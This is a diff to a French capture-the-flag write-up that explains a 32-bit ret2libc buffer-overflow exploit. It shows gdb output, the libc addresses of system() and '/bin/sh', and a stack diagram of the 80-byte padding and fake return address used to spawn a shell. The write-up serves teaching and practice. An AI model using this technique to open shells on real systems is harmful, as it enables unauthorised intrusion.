@@ -26,9 +26,10 @@ Le binaire est en 32 bits sans NX désactivé sur la pile ? Peu importe : on n'a
 
 ## Recherche de l'offset
 
-On envoie un pattern unique en mot de passe pour repérer combien d'octets séparent le début de `password` de l'adresse de retour sauvegardée de `main`.
+On lance le binaire dans gdb et on envoie un pattern unique en mot de passe pour repérer combien d'octets séparent le début de `password` de l'adresse de retour sauvegardée de `main`.
 
 ```
+(gdb) run
 ********* ADMIN LOGIN PROMPT *********
 Enter Username: dat_wil
 verifying username....
@@ -64,19 +65,30 @@ Adresse de la chaîne `"/bin/sh"` dans la libc :
 (gdb) r
 (gdb) find __libc_start_main,+99999999,"/bin/sh"
 0xf7f897ec
+warning: Unable to access target memory at 0xf7fd3b74, halting search.
 1 pattern found.
 ```
 
 ### Layout de la pile attendu par `system()`
 
-Quand `main` exécute `ret`, le CPU saute à l'adresse pointée et `esp` pointe sur les octets juste après. `system()` croit avoir été appelée normalement, donc elle s'attend à :
+Quand `main` exécute `ret`, le CPU saute à l'adresse pointée et `esp` pointe sur les octets juste après. `system()` croit avoir été appelée normalement, donc elle s'attend à trouver sur la pile :
 
 ```
-[ esp     ] → son adresse de retour (où revenir quand elle a fini)
-[ esp + 4 ] → son 1er argument (le char * à exécuter)
+  adresses hautes
+        ┌──────────────────────┐
+esp+4   │  @"/bin/sh"          │  ← 1er argument de system() après ret
+        │  (0xf7f897ec)        │
+        ├──────────────────────┤
+esp     │  "osef" (faux retour)│  ← esp après ret, system() croit que c'est son adresse de retour
+        ├──────────────────────┤
+esp     │  @system (0xf7e6aed0)│  ← esp avant ret, ret dépile cette adresse et saute dessus
+        ├──────────────────────┤         (esp avance de 4)
+        │       "A" * 80       │  ← buffer password (padding, overflow vers le haut)
+        └──────────────────────┘
+  adresses basses
 ```
 
-L'argument est lu à `esp+4`, pas à `esp`. Il faut donc bourrer `esp` avec 4 octets quelconques (la "fausse" adresse de retour de `system`) pour que `/bin/sh` tombe à la bonne position. On utilise `"osef"` parce qu'on s'en fiche : le shell sera ouvert avant que `system()` ne retourne, et on aura déjà lu le flag.
+L'argument est lu à `esp+4`, pas à `esp`. Il faut donc mettre 4 octets quelconques après `@system` (la "fausse" adresse de retour) pour que `@"/bin/sh"` tombe à la bonne position. On utilise `"osef"` parce qu'on s'en fiche : le shell sera ouvert avant que `system()` ne retourne, et on aura déjà lu le flag.
 
 ### Construction du payload
 
